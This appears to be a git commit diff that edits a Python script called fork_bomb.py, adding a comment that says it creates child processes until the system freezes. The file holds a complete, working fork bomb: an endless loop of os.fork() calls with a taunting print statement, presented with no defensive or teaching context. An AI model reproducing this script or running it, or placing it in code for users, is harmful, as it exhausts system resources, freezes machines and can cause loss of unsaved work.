aeb4f7c975bac167f0f9dc28c5cf3e5efa058326
Karmhack <78755695+Karmhack@users.noreply.github.com>
2023-01-01 11:59:45 +0100

    Update fork_bomb.py

--- fork_bomb.py
+++ fork_bomb.py
@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 
+# Create child processes until the system freeze
+
 import os
 
 while True:
-    os.fork()
+    os.fork() 
     print("MOUAHAHAHAHAAH!")
     os.system('clear')
